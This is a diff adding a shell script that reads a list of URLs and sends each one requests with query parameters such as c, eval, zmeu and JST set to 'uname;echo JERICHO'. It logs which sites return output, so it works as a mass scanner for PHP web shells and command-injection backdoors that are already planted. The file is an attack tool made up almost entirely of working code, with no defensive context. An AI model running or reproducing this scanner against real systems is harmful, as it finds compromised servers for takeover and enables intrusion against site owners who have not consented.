@@ -1,0 +1,15 @@
+#!/bin/sh
+#!/bin/bash
+
+for i in `cat $1`
+do
+sleep 1
+echo " *Vuln: ""$i"?c="  *Result: `curl -s -m 10 -g ""$i"?c=uname;echo JERICHO" |tr '>' ' ' |tr '<' ' '|sed 's/pre//g' |sed 's/ //g' |tr '/' ' ' |head -n1`"  >>php.log 2>/dev/null
+echo " *Vuln: ""$i"?d="  *Result: `curl -s -m 10 -g ""$i"?d=uname;echo JERICHO" |tr '>' ' ' |tr '<' ' '|sed 's/pre//g' |sed 's/ //g' |tr '/' ' ' |head -n1`"  >>php.log 2>/dev/null
+echo " *Vuln: ""$i"?m="  *Result: `curl -s -m 10 -g ""$i"?m=uname;echo JERICHO" |tr '>' ' ' |tr '<' ' '|sed 's/pre//g' |sed 's/ //g' |tr '/' ' ' |head -n1`"  >>php.log 2>/dev/null
+echo " *Vuln: ""$i"?x="  *Result: `curl -s -m 10 -g ""$i"?x=uname;echo JERICHO" |tr '>' ' ' |tr '<' ' '|sed 's/pre//g' |sed 's/ //g' |tr '/' ' ' |head -n1`"  >>php.log 2>/dev/null
+echo " *Vuln: ""$i"?eval="  *Result: `curl -s -m 10 -g ""$i"?eval=uname;echo JERICHO" |tr '>' ' ' |tr '<' ' '|sed 's/pre//g' |sed 's/ //g' |tr '/' ' ' |head -n1`"  >>php.log 2>/dev/null
+echo " *Vuln: ""$i"?zmeu="  *Result: `curl -s -m 10 -g ""$i"?zmeu=uname;echo JERICHO" |tr '>' ' ' |tr '<' ' '|sed 's/pre//g' |sed 's/ //g' |tr '/' ' ' |head -n1`"  >>php.log 2>/dev/null
+echo " *Vuln: ""$i"?JST="  *Result: `curl -s -m 10 -g ""$i"?JST=uname;echo JERICHO" |tr '>' ' ' |tr '<' ' '|sed 's/pre//g' |sed 's/ //g' |tr '/' ' ' |head -n1`"  >>php.log 2>/dev/null
+sleep 1
+done
